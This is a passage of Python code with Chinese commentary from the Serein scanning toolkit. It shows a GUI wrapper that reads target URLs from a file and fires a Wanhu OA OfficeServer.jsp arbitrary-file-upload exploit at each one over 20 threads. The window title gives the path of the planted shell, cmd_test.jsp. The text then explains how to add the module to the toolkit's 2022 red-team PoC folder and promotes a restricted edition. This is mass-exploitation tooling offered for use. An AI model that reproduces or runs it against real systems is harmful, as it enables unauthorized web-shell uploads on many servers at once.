&quot;) wanhu_oa_officeserver_anyfileupload_text.see(END)def get_wanhu_oa_officeserver_anyfileupload_addr(): with open(&quot;修正后的url.txt&quot;,&quot;r&quot;) as f: for address in f.readlines(): address = address.strip() yield addressdef wanhu_oa_officeserver_anyfileupload_gui(): wanhu_oa_officeserver_anyfileupload = tk.Tk() wanhu_oa_officeserver_anyfileupload.geometry(&quot;910x450&quot;) wanhu_oa_officeserver_anyfileupload.title(&quot;万户OA OfficeServer.jsp 任意文件上传漏洞一把梭 上传后文件路径为：/defaultroot/public/edit/cmd_test.jsp&quot;) wanhu_oa_officeserver_anyfileupload.resizable(0, 0) wanhu_oa_officeserver_anyfileupload.iconbitmap('logo.ico') global wanhu_oa_officeserver_anyfileupload_text wanhu_oa_officeserver_anyfileupload_text = scrolledtext.ScrolledText(wanhu_oa_officeserver_anyfileupload,width=123, height=25) wanhu_oa_officeserver_anyfileupload_text.grid(row=0, column=0, padx=10, pady=10) wanhu_oa_officeserver_anyfileupload_text.see(END) addrs = get_wanhu_oa_officeserver_anyfileupload_addr() max_thread_num = 20 executor = ThreadPoolExecutor(max_workers=max_thread_num) for addr in addrs: future = executor.submit(wanhu_oa_officeserver_anyfileupload_exp, addr) wanhu_oa_officeserver_anyfileupload.mainloop() 把它重新放到Serein_hvv的hvv_2022_poc文件夹下即可。 关于SereinSerein目前有三个版本，分别是Serein、Serein_Linux、Serein_hvv。 Serein的使用、添加自己的poc的教程已经上传到了B站上： 其中Serein护网版(Serein_hvv)需要扫描二维码加群从群公告中获取： 有什么建议和意见、活跃的想法都可以提出来，一起探讨，互相进步！
